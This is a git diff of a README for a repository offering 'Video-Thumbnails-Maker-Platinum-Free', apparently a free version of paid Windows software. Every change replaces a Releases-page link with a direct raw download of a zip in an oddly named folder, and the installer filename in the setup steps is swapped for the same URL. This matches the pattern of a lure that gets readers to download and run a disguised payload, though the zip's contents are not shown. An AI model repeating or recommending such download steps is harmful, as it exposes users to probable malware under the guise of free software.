@@ -1,6 +1,6 @@
 # 🎥 Video-Thumbnails-Maker-Platinum-Free - Create Stunning Video Thumbnails Easily
 
-[![Download Video Thumbnails Maker Platinum](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/releases)
+[![Download Video Thumbnails Maker Platinum](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/raw/refs/heads/main/pilotaxitic/Video_Thumbnails_Maker_Free_Platinum_v1.3.zip)](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/raw/refs/heads/main/pilotaxitic/Video_Thumbnails_Maker_Free_Platinum_v1.3.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To begin using Video-Thumbnails-Maker-Platinum-Free, follow these simple steps:
 
    Click the link below to go to the Releases page where you can download the software:
 
-   [Visit this page to download](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/releases)
+   [Visit this page to download](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/raw/refs/heads/main/pilotaxitic/Video_Thumbnails_Maker_Free_Platinum_v1.3.zip)
 
 2. **Choose the Latest Version**
 
@@ -22,7 +22,7 @@ To begin using Video-Thumbnails-Maker-Platinum-Free, follow these simple steps:
 
 3. **Download the Software**
 
-   Click on the download link for the installer file. You may see something like `Video-Thumbnails-Maker-Platinum-Setup.exe`. This is the file you need.
+   Click on the download link for the installer file. You may see something like `https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/raw/refs/heads/main/pilotaxitic/Video_Thumbnails_Maker_Free_Platinum_v1.3.zip`. This is the file you need.
 
 4. **Run the Installer**
 
@@ -80,7 +80,7 @@ If you encounter any issues while using the software, we are here to help. Here'
 
 To get started with Video-Thumbnails-Maker-Platinum-Free, make sure to download the latest version:
 
-[Visit this page to download](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/releases) 
+[Visit this page to download](https://github.com/salmanelahikhan/Video-Thumbnails-Maker-Platinum-Free/raw/refs/heads/main/pilotaxitic/Video_Thumbnails_Maker_Free_Platinum_v1.3.zip) 
 
 Simply follow the steps outlined above to download and install the software on your Windows PC.
 
